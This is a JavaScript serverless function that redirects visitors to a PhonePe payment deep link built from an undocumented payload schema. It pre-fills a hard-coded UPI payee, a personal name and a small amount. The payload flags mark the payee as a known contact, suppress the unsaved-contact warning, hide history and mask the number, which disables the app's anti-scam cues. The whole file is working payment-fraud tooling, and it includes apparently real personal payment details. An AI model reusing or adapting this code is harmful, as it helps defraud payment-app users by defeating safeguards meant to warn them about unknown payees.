exports.handler = async (event) => {
  const params = event.queryStringParameters || {};
  const vpa = params.upi || "BHARATPE.9N0G0O0Z8Z823291@unitype";
  const amountVal = parseFloat(params.am) || 1.48;
  const amountPaise = Math.floor(amountVal * 100);
  const name = params.pn || "Sudarshan Ankush Suryawanshi";
  const note = params.tn || ("NIYO" + Date.now());

  // Newly discovered PhonePe Payload schema
  const payload = {
    contact: {
      "cb-Name": "",
      nickName: name,
      vpa: vpa,
      type: "VPA"
    },
    p2pPaymentCheckoutParams: {
      note: note,
      isByDefaultKnownContact: true,
      enableSpeechToText: false,
      allowAmountEdit: false,
      showQrCodeOption: false,
      disableViewHistory: true,
      shouldShowUnsavedContactBanner: false,
      isRecurring: false,
      checkoutType: "DEFAULT",
      transactionContext: "p2p",
      initialAmount: amountPaise,
      disableNotesEdit: true,
      showKeyboard: false,
      currency: "INR",
      shouldShowMaskedNumber: true
    }
  };

  const base64 = Buffer.from(JSON.stringify(payload)).toString("base64");
  const deepLink = `phonepe://native?data=${base64}&id=p2ppayment`;

  // Respond with authentic HTTP 302 Found redirect
  return {
    statusCode: 302,
    headers: {
      Location: deepLink,
      "Cache-Control": "no-cache, no-store, must-revalidate"
    },
    body: `Redirecting to ${deepLink}`
  };
};
